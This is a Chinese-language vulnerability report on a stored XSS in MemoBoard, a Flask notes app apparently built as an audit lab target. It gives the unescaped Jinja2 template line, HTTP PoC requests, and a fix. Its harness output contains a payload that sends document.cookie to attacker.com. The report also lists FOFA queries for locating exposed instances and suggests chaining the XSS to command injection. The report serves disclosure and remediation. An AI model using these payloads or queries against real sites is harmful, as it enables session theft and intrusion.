---
title: "MemoBoard 存储型 XSS（备忘录 body 未转义渲染）"
summary: "POST /api/notes body → notes.html {{ n.body | safe }}"
---

# MemoBoard 存储型 XSS（备忘录 body 未转义渲染）

## 漏洞描述

MemoBoard 是一款基于 Flask 的内网备忘录看板应用。

匿名 `POST /api/notes` 写入的 body，在公开页 `GET /notes` 经 Jinja2 `| safe` 原样输出，构成存储型 XSS。

## 漏洞危害

- 已证明危害：恶意 HTML/脚本持久化后，任何访问 `/notes` 的访客浏览器都会执行该脚本。
- 潜在危害：可窃取 admin 的 Flask session cookie，进而调用需管理员会话的接口。
- SQL 注入须明确：是否能获取 OS-Shell：不适用
- SSRF 须明确：观察面：不适用

## 漏洞厂商全称

MemoBoard（VulnHunter 白盒审计靶场项目）

## 已知受影响产品及版本

MemoBoard v0.5.0（`board/__init__.py` `__version__ = "0.5.0"`）

## 互联网资产证明
> 用于在公开资产测绘平台定位同类应用资产；优先使用应用自身稳定特征，不把漏洞路径、PoC 参数或一次性业务数据当作唯一指纹。测绘语句不允许出现「或」关系。

### 精准测绘语法

#### FOFA
```text
title="MemoBoard notes" && icon_hash="-151231234" && body="MemoBoard"
```

#### X 情报社区
```text
title="MemoBoard notes" && app="MemoBoard notes" && icon_hash="-151231234"
```

## 漏洞技术细节

### Source → Sink

- Source：`POST /api/notes` JSON/form 的 `body`（`src/app.py:87` `api_create_note`，无鉴权）
- 传递：`create_note(...)` 参数化 INSERT（SQL 安全，不转义 HTML）
- Sink：`GET /notes` → `src/templates/notes.html:18` `{{ n.body | safe }}`，跳过 Jinja2 自动转义

### 漏洞代码

- 完整路径：`src/templates/notes.html:18`

```html
<div class="body">{{ n.body | safe }}</div>
```

### 完整 PoC 描述

可运行脚本见同目录 `poc.py`（`python poc.py -u <目标>`；须支持 `--proxy`；输出默认英语，`--zh` 切中文）。

```http
POST /api/notes HTTP/1.1
Host: TARGET:5000
Content-Type: application/json
Connection: close

{"title":"test","body":"<script>alert(document.cookie)</script>","author":"anonymous"}
```

```http
GET /notes HTTP/1.1
Host: TARGET:5000
Connection: close
```

第二步响应 HTML 中应出现未转义的 `<script>alert(document.cookie)</script>`。

### 触发条件

无需登录即可写入；`/notes` 为公开页。默认配置即可。利用需受害者打开该页（UI:R / UI:P），不是无交互 RCE。

## 同根因受影响点

- `src/templates/notes.html:18` `{{ n.body | safe }}` — 跳过转义（代表点）
- `src/app.py:87` `api_create_note` — 无鉴权写入
- `src/app.py:37` `notes_page` — 渲染未转义 body

## 复现证明

### 基础环境搭建

动态环境尚未落盘，见 `docs/lab.md`。本项目验证方式为局部验证（harness）。

### 漏洞触发操作

#### 局部验证（harness）

harness 脚本（`harness.py`）在沙箱中执行结果如下（粘贴 stdout 关键输出，截取关键行）：

```text
Note created id=1 payload=<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>
Rendered HTML with | safe:
... <div class="body"><script>fetch("https://attacker.com/steal?c="+document.cookie)</script></div> ...
XSS payload rendered unescaped.
Without | safe, payload is HTML-escaped:
... <div class="body">&lt;script&gt;fetch(&quot;https://attacker.com/steal?c=&quot;+document.cookie)&lt;/script&gt;</div> ...
```

**为何 harness 能证明漏洞存在**：harness 按 `create_note` 把脚本写入 SQLite，再按 `| safe` 与默认转义两条路径渲染。运行时 HTML 中出现原始 `<script>fetch(...)`，去掉 `| safe` 后变成 `&lt;script&gt;`。这对应模板跳过自动转义，而不是只断言 SUCCESS。

#### 动态验证（靶场 PoC）

本条以 harness 确认。对已运行实例可用同目录 `poc.py` 复测：

```http
POST /api/notes HTTP/1.1
Host: TARGET:5000
Content-Type: application/json
Connection: close

{"title":"test","body":"<script>alert(document.cookie)</script>","author":"anonymous"}
```

```text
python poc.py -u http://TARGET:5000
python poc.py -u http://TARGET:5000 --zh
python poc.py -u http://TARGET:5000 --proxy http://127.0.0.1:8080
```

**为何 PoC 能利用该漏洞**：匿名 JSON `body` 入库后，公开 `/notes` 用 `| safe` 输出。成功时页面 HTML 含未转义 payload 原文。

### 预期证据

`GET /notes` 的 HTML 含原始 `<script>...`（或所选 payload），而不是 `&lt;script&gt;`。

### 复现注意事项

存储型 XSS 需要受害者打开 `/notes`。不要把本条标成无需交互的前台 RCE。

## 修复方案

去掉 `| safe`，使用 Jinja2 默认转义；如需部分 HTML，用白名单过滤器。为 `POST /api/notes` 增加鉴权。

```html
<div class="body">{{ n.body }}</div>
```

## 备注

可与 admin ping 命令注入组成需交互的攻击链（XSS 劫持 admin 浏览器后同源请求 ping）。

---

## 审核标注

- 攻击面：前台
- 配置前提：默认配置
- 严重度：高危（high）
- CVSS 3.1：8.2
- 评分向量：CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
- CVSS 4.0：7.1
- CVSS 4.0 向量：CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N
- 价值分层：有 CVE 价值（cve_candidate）
- 分层理由：Stored XSS: anonymous attacker injects persistent JavaScript via unauthenticated POST /api/notes, which executes in every visitor's browser (including admin) on the public /notes page. The | safe filter in notes.html:18 disables Jinja2 auto-escaping. Can steal admin session cookies and chain to RCE via admin ping endpoint. Clear, independently exploitable, CVE-worthy impact.
- 根因合并键：stored_xss:notes.html
